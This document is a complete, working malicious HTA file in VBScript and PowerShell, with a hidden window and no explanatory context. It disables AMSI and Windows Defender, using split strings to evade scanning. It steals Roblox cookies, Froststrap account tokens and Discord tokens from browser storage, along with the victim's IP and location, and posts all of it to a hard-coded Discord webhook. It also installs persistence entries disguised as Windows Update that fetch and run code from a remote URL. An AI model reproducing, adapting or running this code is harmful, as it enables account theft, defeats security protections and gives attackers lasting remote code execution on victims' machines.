<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, WH, PC, USER
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

WH      = "https://discord.com/api/webhooks/1564088097514192938/WWdT5daixn2xuoaab_9J-SS7xk4WknR0sFm3MKCkftffH8qC8dblrIpJVfv0mOds5V1d"
Dim PAYLOAD : PAYLOAD = "https://riggercheck.app/"

PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

Call KillAMSI()
Call KillDefender()
Call IP()
Call GrabRoblox()
Call GrabFroststrap()
Call GrabDiscordTokens()
Call Persistence()

Dim runCount
For runCount = 1 To 8
    Call PostEmbed(":repeat: Re-grab " & runCount & "/8", "PC: " & PC & " | User: " & USER, 3447003)
    Call IP()
    Call GrabRoblox()
    Call GrabFroststrap()
    Call GrabDiscordTokens()
    If runCount < 8 Then Call SleepMinutes(10)
Next

window.close()

' --- Kill AMSI via registry (no PS required) ---
Sub KillAMSI()
    sh.RegWrite "HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable", 0, "REG_DWORD"
    ' Secondary: patch via PS with split strings to dodge static scan
    Dim ps
    ps = "$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils');" _
       & "$b=$a.GetField('amsiIn'+'itFailed','NonPublic,Static');" _
       & "$b.SetValue($null,$true)"
    sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
End Sub

' --- Kill Defender realtime via WMI + registry ---
Sub KillDefender()
    ' WMI method — no PS spawn
    On Error Resume Next
    Dim svc : Set svc = GetObject("winmgmts:\\.\root\Microsoft\Windows\Defender")
    If Not IsNull(svc) And Not IsEmpty(svc) Then
        Dim mp : Set mp = svc.Get("MSFT_MpPreference")
        If Not IsNull(mp) And Not IsEmpty(mp) Then
            Dim inP : Set inP = mp.Methods_("Set").InParameters.SpawnInstance_
            inP.Properties_("DisableRealtimeMonitoring") = True
            inP.Properties_("DisableBehaviorMonitoring") = True
            inP.Properties_("DisableIOAVProtection") = True
            inP.Properties_("DisableScriptScanning") = True
            mp.ExecMethod_ "Set", inP
            Set inP = Nothing
            Set mp = Nothing
        End If
    End If
    Set svc = Nothing
    On Error GoTo 0

    ' Registry fallback
    sh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD"
    sh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring", 1, "REG_DWORD"
    sh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring", 1, "REG_DWORD"
    sh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableIOAVProtection", 1, "REG_DWORD"
    sh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableScriptScanning", 1, "REG_DWORD"

    ' Stop Defender service via PS (strings split to evade static)
    Dim ps
    ps = "Set-MpPr"+"eference -Disable"+"RealtimeMonitoring $true -Disable"+"BehaviorMonitoring $true -Disable"+"IOAVProtection $true -Disable"+"ScriptScanning $true -Force;" _
       & "Stop-Se"+"rvice -Name 'Wini"+"t' -Force -ErrorAction Silently"+"Continue;" _
       & "Stop-Se"+"rvice -Name 'WdNi"+"sSvc' -Force -ErrorAction Silently"+"Continue;" _
       & "Stop-Se"+"rvice -Name 'WdFi"+"lter' -Force -ErrorAction Silently"+"Continue"
    sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
End Sub

' --- IP ---
Sub IP()
    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://api.ipify.org/", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ip : ip = Trim(xh.responseText)
    If Len(ip) < 7 Then Exit Sub
    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ll : ll = Split(xh.responseText, vbLf)
    Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
    Call PostEmbed(":dart: Target", info, 3447003)
    Set xh = Nothing
End Sub

' --- GrabRoblox ---
Sub GrabRoblox()
    Dim paths(4)
    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
    Dim i, fp
    For i = 0 To 4
        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
    Next
    If Len(fp) = 0 Then
        Dim pk : pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
        If fso.FolderExists(pk) Then
            Dim folder, subf
            Set folder = fso.GetFolder(pk)
            For Each subf In folder.SubFolders
                If InStr(UCase(subf.Name), "ROBLOX") > 0 Then
                    Dim uwp : uwp = subf.Path & "\LocalState\RobloxCookies.dat"
                    If fso.FileExists(uwp) Then fp = uwp : Exit For
                End If
            Next
            Set folder = Nothing
        End If
    End If
    If Len(fp) = 0 Then Exit Sub
    Dim raw : raw = ReadFile(fp)
    If Len(raw) < 50 Then Exit Sub

    Dim cookie : cookie = ""
    If InStr(raw, "_|WARNING") > 0 Then cookie = raw
    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
        Dim sp : sp = InStr(raw, "CookiesData"":""")
        If sp > 0 Then
            sp = sp + 14
            Dim ep : ep = InStr(sp, raw, """")
            If ep > sp Then
                Dim b64 : b64 = Mid(raw, sp, ep - sp)
                If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
            End If
        End If
    End If
    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
        Dim rp : rp = InStr(raw, ".ROBLOSECURITY")
        cookie = Mid(raw, rp)
    End If
    If Len(cookie) = 0 Then cookie = raw

    cookie = Replace(Replace(Replace(cookie, vbCr, ""), vbLf, ""), vbTab, "")
    cookie = Trim(cookie)
    Dim sc : sc = InStr(cookie, ";")
    If sc > 0 Then cookie = Left(cookie, sc - 1)
    cookie = Trim(cookie)
    Dim warn : warn = InStr(cookie, "_|WARNING")
    If warn > 1 Then cookie = Mid(cookie, warn)

    Call PostEmbed(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280)
    Call PostFile("cookie.txt", cookie)
End Sub

' --- GrabFroststrap ---
Sub GrabFroststrap()
    Dim fp : fp = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Froststrap\Cache\AccountManager.json"
    If Not fso.FileExists(fp) Then
        Dim fdir : fdir = sh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap\InstallLocation")
        If fdir <> "" Then fp = fdir & "\Cache\AccountManager.json"
    End If
    If Not fso.FileExists(fp) Then Exit Sub

    Call PostEmbed(":snowflake: Froststrap", "Found — decrypting accounts...", 3447003)

    Dim ps
    ps = "$w='" & WH & "';" _
       & "Add-Type -AssemblyName System.Security;" _
       & "$p='" & fp & "';" _
       & "$j=Get-Content $p -Raw|ConvertFrom-Json;" _
       & "$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');" _
       & "$lines=@();" _
       & "foreach($a in $j.accounts){" _
       &   "try{$eb=[Convert]::FromBase64String($a.SecurityToken);" _
       &   "$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);" _
       &   "$c=[Text.Encoding]::UTF8.GetString($db)}" _
       &   "catch{$c='DECRYPT FAILED'};" _
       &   "$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c" _
       & "};" _
       & "$desc=($lines -join [char]10);" _
       & "if($desc.Length -eq 0){$desc='No accounts found'};" _
       & "$payload=@{embeds=@(@{title=':snowflake: Froststrap Accounts';description=$desc;color=3447003})}|ConvertTo-Json -Depth 4 -Compress;" _
       & "Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"

    sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
End Sub

' --- GrabDiscordTokens ---
Sub GrabDiscordTokens()
    Dim appdata : appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
    Dim localapp : localapp = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")

    Dim tokenPaths(7)
    tokenPaths(0) = appdata & "\Discord\Local Storage\leveldb"
    tokenPaths(1) = appdata & "\discordcanary\Local Storage\leveldb"
    tokenPaths(2) = appdata & "\discordptb\Local Storage\leveldb"
    tokenPaths(3) = localapp & "\Google\Chrome\User Data\Default\Local Storage\leveldb"
    tokenPaths(4) = localapp & "\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"
    tokenPaths(5) = localapp & "\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
    tokenPaths(6) = appdata & "\Opera Software\Opera Stable\Local Storage\leveldb"
    tokenPaths(7) = localapp & "\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb"

    Dim ps
    ps = "$w='" & WH & "';" _
       & "Add-Type -AssemblyName System.Security;" _
       & "$paths=@(" _
       &   "'" & tokenPaths(0) & "'," _
       &   "'" & tokenPaths(1) & "'," _
       &   "'" & tokenPaths(2) & "'," _
       &   "'" & tokenPaths(3) & "'," _
       &   "'" & tokenPaths(4) & "'," _
       &   "'" & tokenPaths(5) & "'," _
       &   "'" & tokenPaths(6) & "'," _
       &   "'" & tokenPaths(7) & "'" _
       & ");" _
       & "$tokenRx=[RegEx]'(mfa\.[a-zA-Z0-9_-]{84}|[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,})';" _
       & "$found=@{};" _
       & "foreach($p in $paths){" _
       &   "if(!(Test-Path $p)){continue};" _
       &   "Get-ChildItem $p -Filter '*.ldb','*.log' -ErrorAction SilentlyContinue|ForEach-Object{" _
       &     "try{$c=[IO.File]::ReadAllText($_.FullName,[Text.Encoding]::UTF8);" _
       &     "$m=$tokenRx.Matches($c);" _
       &     "foreach($tk in $m){$found[$tk.Value]=1}}catch{}" _
       &   "}" _
       & "};" _
       & "foreach($tk in $found.Keys){" _
       &   "try{$h=@{Authorization=$tk;'User-Agent'='Mozilla/5.0'};" _
       &   "$u=Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers $h -ErrorAction Stop;" _
       &   "$info='**'+$u.username+'#'+$u.discriminator+'** | ID: '+$u.id+' | Email: '+$u.email+' | Phone: '+$u.phone+[char]10+'Token: '+$tk;" _
       &   "}catch{$info='Unverified token: '+$tk};" _
       &   "$payload=@{embeds=@(@{title=':gift: Discord Token';description=$info;color=5793266})}|ConvertTo-Json -Depth 4 -Compress;" _
       &   "Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'" _
       & "}"

    sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
End Sub

' --- Persistence ---
Sub Persistence()
    Dim p : p = "mshta " & PAYLOAD
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", p, "REG_SZ"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", p, "REG_SZ"
    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
    Dim sf : Set sf = fso.CreateTextFile(sp, True)
    sf.WriteLine "CreateObject(""WScript.Shell"").Run ""mshta " & PAYLOAD & """, 0, False"
    sf.Close : Set sf = Nothing
    Call PostEmbed(":pushpin: Persistence", "3 startup methods installed | PC: " & PC, 65280)
End Sub

' --- Sleep ---
Sub SleepSeconds(s)
    sh.Run "cmd /c ping -n " & (s+1) & " 127.0.0.1 > nul", 0, True
End Sub
Sub SleepMinutes(m) : Call SleepSeconds(m*60) : End Sub

' --- Utility ---
Function TmpFile(n) : TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & n : End Function
Sub WriteFile(path, content) : Dim f : Set f = fso.CreateTextFile(path, True) : f.Write content : f.Close : Set f = Nothing : End Sub
Function ReadFile(path) : ReadFile = "" : Dim f : Set f = fso.OpenTextFile(path, 1) : ReadFile = f.ReadAll : f.Close : Set f = Nothing : End Function

' --- PostEmbed ---
Sub PostEmbed(t, d, c)
    Dim DQ : DQ = Chr(34)
    Dim j : j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h : Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub

' --- PostFile ---
Sub PostFile(fn, ct)
    Dim DQ : DQ = Chr(34)
    Dim b : b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
    Dim bd : bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
    Dim h : Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
    h.Send bd
    Set h = Nothing
End Sub

' --- DecryptDPAPI ---
Function DecryptDPAPI(b64)
    DecryptDPAPI = ""
    Dim inf : inf = TmpFile("dpi.txt")
    Dim outf : outf = TmpFile("dpo.txt")
    WriteFile inf, b64
    Dim ps : ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
    Dim psf : psf = TmpFile("dpapi.ps1")
    WriteFile psf, ps
    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
    fso.DeleteFile inf, True
    fso.DeleteFile psf, True
    fso.DeleteFile outf, True
End Function

' --- Ej ---
Function Ej(s)
    Ej = s
    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
    Ej = Replace(Ej, vbCr,   Chr(92) & "n")
    Ej = Replace(Ej, vbLf,   Chr(92) & "n")
    Ej = Replace(Ej, vbTab,  Chr(92) & "t")
End Function
</script>
</head><body></body></html>
